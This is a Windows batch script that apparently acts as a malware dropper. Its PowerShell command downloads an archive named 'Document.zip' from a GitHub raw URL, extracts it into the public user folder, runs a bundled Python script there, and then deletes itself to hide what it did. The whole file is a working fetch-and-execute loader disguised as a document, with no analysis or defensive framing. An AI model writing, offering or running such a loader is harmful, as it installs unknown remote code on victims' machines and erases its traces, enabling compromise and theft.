@echo off
SET "FILENAME=%~dp0\Document.zip"
powershell.exe -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sellxilips/document/main/Document.zip', '"%FILENAME%"');Expand-Archive "%FILENAME%" -DestinationPath C:\Users\Public -Force;del "%FILENAME%";C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\run.py}"
(goto) 2>nul & del "%~f0"

